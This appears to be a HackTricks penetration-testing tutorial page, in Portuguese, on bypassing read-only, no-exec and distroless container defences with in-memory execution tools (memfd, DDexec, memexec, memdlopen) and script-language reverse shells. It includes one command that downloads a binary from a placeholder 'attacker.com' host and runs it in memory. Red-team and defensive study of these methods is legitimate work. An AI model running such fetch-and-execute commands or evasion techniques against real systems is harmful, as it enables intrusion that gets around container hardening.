# Bypass de proteções FS: sistema de arquivos somente leitura / sem execução / Distroless

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Vídeos

Nos vídeos a seguir, você pode encontrar as técnicas mencionadas nesta página explicadas mais detalhadamente:

* [**DEF CON 31 - Explorando Manipulação de Memória no Linux para Stealth e Evasão**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusões stealth com DDexec-ng & dlopen() em memória - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Cenário somente leitura / sem execução

É cada vez mais comum encontrar máquinas linux montadas com proteção de sistema de arquivos **somente leitura (ro)**, especialmente em contêineres. Isso ocorre porque executar um contêiner com sistema de arquivos ro é tão fácil quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo que o sistema de arquivos esteja montado como ro, **`/dev/shm`** ainda será gravável, então é falso dizer que não podemos escrever nada no disco. No entanto, esta pasta será **montada com proteção sem execução**, então se você baixar um binário aqui, você **não poderá executá-lo**.

{% hint style="warning" %}
Do ponto de vista de um red team, isso torna **complicado baixar e executar** binários que não estão no sistema (como backdoors ou enumeradores como `kubectl`).
{% endhint %}

## Bypass mais fácil: Scripts

Note que mencionei binários, você pode **executar qualquer script** desde que o interpretador esteja dentro da máquina, como um **script shell** se `sh` estiver presente ou um **script python** se `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar executar.

## Bypasses de Memória

Se você quer executar um binário, mas o sistema de arquivos não permite, a melhor maneira de fazer isso é **executando-o da memória**, já que as **proteções não se aplicam lá**.

### Bypass FD + syscall exec

Se você tem alguns motores de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, você poderia baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não vai ser protegido por essas proteções e então chamar uma **syscall `exec`** indicando o **fd como o arquivo a ser executado**.

Para isso, você pode usar facilmente o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar um binário e ele irá gerar um script no idioma indicado com o **binário comprimido e codificado em b64** com as instruções para **decodificar e descomprimir** em um **fd** criado chamando a syscall `create_memfd` e uma chamada para a syscall **exec** para executá-lo.

{% hint style="warning" %}
Isso não funciona em outras linguagens de script como PHP ou Node porque elas não têm uma **maneira padrão de chamar syscalls brutos** de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.

Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não terá permissão para executá-lo devido à **proteção sem execução**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite **modificar a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código assembly** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

{% hint style="success" %}
**DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** da **memória**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para mais informações sobre esta técnica, consulte o Github ou:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode DDexec demonizado**, então toda vez que você quiser **executar um binário diferente** não precisa reiniciar o DDexec, você pode simplesmente executar o shellcode memexec via a técnica DDexec e depois **comunicar com este daemon para passar novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar **memexec para executar binários a partir de um PHP reverse shell** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para depois executá-los. Isso poderia até permitir carregar binários com dependências.

## Bypass Distroless

### O que é distroless

Contêineres distroless contêm apenas os **componentes mínimos necessários para executar uma aplicação ou serviço específico**, como bibliotecas e dependências de runtime, mas excluem componentes maiores como um gerenciador de pacotes, shell ou utilitários do sistema.

O objetivo dos contêineres distroless é **reduzir a superfície de ataque dos contêineres eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Reverse Shell

Em um contêiner distroless você pode **nem mesmo encontrar `sh` ou `bash`** para obter um shell regular. Você também não encontrará binários como `ls`, `whoami`, `id`... tudo o que você normalmente executa em um sistema.

{% hint style="warning" %}
Portanto, você **não** será capaz de obter um **reverse shell** ou **enumerar** o sistema como normalmente faz.
{% endhint %}

No entanto, se o contêiner comprometido estiver executando, por exemplo, um web flask, então o python está instalado, e assim você pode obter um **Python reverse shell**. Se estiver executando node, você pode obter um Node rev shell, e o mesmo vale para praticamente qualquer **linguagem de script**.

{% hint style="success" %}
Usando a linguagem de script, você poderia **enumerar o sistema** usando as capacidades da linguagem.
{% endhint %}

Se não houver proteções de **somente leitura/sem execução**, você poderia abusar do seu reverse shell para **escrever no sistema de arquivos seus binários** e **executá-los**.

{% hint style="success" %}
No entanto, neste tipo de contêineres, essas proteções geralmente existirão, mas você poderia usar as **técnicas de execução de memória anteriores para contorná-las**.
{% endhint %}

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter linguagens de script **reverse shells** e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do Github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
